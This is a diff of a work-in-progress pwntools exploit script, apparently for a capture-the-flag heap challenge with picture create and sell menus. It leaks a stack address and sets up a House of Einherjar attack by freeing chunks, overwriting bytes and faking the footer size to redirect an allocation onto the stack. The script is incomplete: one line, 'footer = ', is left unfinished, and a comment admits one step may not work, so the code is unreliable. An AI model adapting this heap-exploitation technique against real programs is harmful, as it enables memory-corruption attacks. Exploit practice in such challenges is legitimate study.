@@ -16,7 +16,6 @@ def gee():
     gdb.attach(r, gdbscript='''
 b sell_picture
 b create_picture
-b fgets
 ''')
     time.sleep(2)
 
@@ -35,7 +34,7 @@ def create(w, h, p, leak=False):
 def sell(idx, price, leak=False):
     # there is something kind of like a race because when we receive the leak, we receive all the data so there is nothing more to receive
     # so need to search for something on that stack that is usable
-    print(idx, price, leak)
+    # print(idx, price, leak)
     if leak == True:
         r.sendline(b"4")
         print('o')
@@ -43,7 +42,6 @@ def sell(idx, price, leak=False):
         r.sendlineafter("> ", b"4")
     print(idx, leak)
     r.sendlineafter(": ", str(idx).encode()) # need to use encode or else it hangs for some reason??? doesnt seem like it's even related to encode actually 
-    print("roger 2")
     if leak == False:
         r.sendlineafter("? ", price)
     else:
@@ -70,14 +68,15 @@ def new_name(p):
 
 def main():
     r.sendlineafter(": ", "a")
-    h1 = str(8)
+    h1 = str(1)
     w1 = str(1)
-    p1 = "C" * 8
+    p1 = "C" * 1
     create(h1, w1, p1)
     create(h1, w1, p1)
     create(h1, w1, p1)
     create(h1, w1, p1)
 
+    gee()
 
     sell(0, "0")
     sell(2, "0")
@@ -111,33 +110,55 @@ def main():
     stack_leak = int(stack_leak, 16) + s_offset
     stack_leak = stack_leak.to_bytes(8, byteorder='big')
     print(f"stack leak with offset: {stack_leak.hex()}")
-    gee()
     payload = 'b'
     new_name(payload)
     sell(1,"0")
     sell(0,"0")
 
-
+    heap_to_stack_offset = 0x7ffc393dc7e0 - 0x55bae5bbc290
+    footer = 
     # Grabbing all the leaks done 
     #
     # We can now do the house of einherjar attack 
-    h1 = str(10)
-    w1 = str(10)
-    payload = b'B' * 100
-    create(h1, w1, payload) # create first chunk since it's a stack 
-    create(h1, w1, payload) # create second that we want to overwrite
-    sell(0, "0") # free first chunk for reallocation
-    mh = 79
-    mw = 16
+    create(str(1), str(1), "A") 
+    create(str(1), str(1), "B")
+    sell(1, "0")
+    # gee()
+    stack_leak = stack_leak[2:][::-1]
+    assert len(stack_leak) == 6
+    print(stack_leak)
+    create(str(6), str(1), b'\x01' * 5 + b'\n')
+    # gee()
+    for i, v in enumerate(stack_leak):
+        if i == len(stack_leak) - 1: break
+        print(hex(v), i)
+        transform(1, 'a', v-1, 0, i)
+    transform(1, 'a', 0x7f-0xa, 0, 5) # this last one might not work 
+    sell(0, "0")
+    create(str(16), str(79), b'A' * 16*78 + b'B' * 16)
+
+    # modify the footer to calculate the size of the offset, which should take us back to the stack pointer
+
+    sell(1, "0")
     
-    create(str(mw), str(mh), b'A'*mh*mw) # allocate with first chunk to overflow second
-    create(str(6), str(1), b'C' * 6) # create a third chunk
-    create(str(6), str(1), b'D' * 6)
 
-
-    sell(2, "0") # causes coalesce with previous chunk but we're erroring on an issue
-    create(str(2), str(1), b'AA')
-
+    ##### Messing around
+    # h1 = str(10)
+    # w1 = str(10)
+    # payload = b'B' * 100
+    # create(h1, w1, payload) # create first chunk since it's a stack 
+    # create(h1, w1, payload) # create second that we want to overwrite
+    # sell(0, "0") # free first chunk for reallocation
+    # mh = 79
+    # mw = 16
+    #
+    # create(str(mw), str(mh), b'A'*mh*mw) # allocate with first chunk to overflow second
+    # create(str(6), str(1), b'C' * 6) # create a third chunk
+    # create(str(6), str(1), b'D' * 6)
+    #
+    # sell(2, "0") # causes coalesce with previous chunk but we're erroring on an issue
+    # create(str(2), str(1), b'AA')
+    #
     r.interactive()
     
 if __name__ == "__main__":
